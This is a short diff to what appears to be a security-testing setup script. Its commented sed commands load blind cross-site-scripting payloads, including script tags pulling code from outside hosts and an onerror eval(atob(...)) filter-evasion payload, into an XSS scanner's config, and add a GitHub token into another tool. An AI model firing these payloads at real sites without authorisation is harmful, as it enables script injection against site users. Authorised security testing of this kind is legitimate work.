@@ -9,6 +9,8 @@ mkdir /root/script
 #replace https://URL to your slack webhook , then copy into /root/script/webhook.sh
 #sed "s,    '<sCriPt sRc=//14.rs>'\,,    'ceye.url'\,\n    '<sCriPt sRc=//14.rs>'\,\n    '\"><script src=blindxss></script>'\,\n    'httpceye.url/'\,,g" core/config.py > 1.txt ; mv 1.txt core/config.py ; sed "s,blindPayload = '',blindPayload = (  # Payloads for filter & WAF evasion\n    '\"><script src=blindxss></script>'\,\n    '\"><img src=xxssonerror=eval(atob(this.id))>'\,\n    '\<script>$.getScript(\"//xss\")</script>'),g" core/config.py > 1.txt ; mv 1.txt core/config.py
 #replace URL to your blind payload , then copy into /root/script/xss.sh
+#token=""
+#sed "s/'token': 'token'token 'token': 'token'/${token}/g" /root/script/git/github_dis/github.py > 1.txt ; mv 1.txt /root/script/git/github_dis/github.py
   
 cd /root/
 apt update
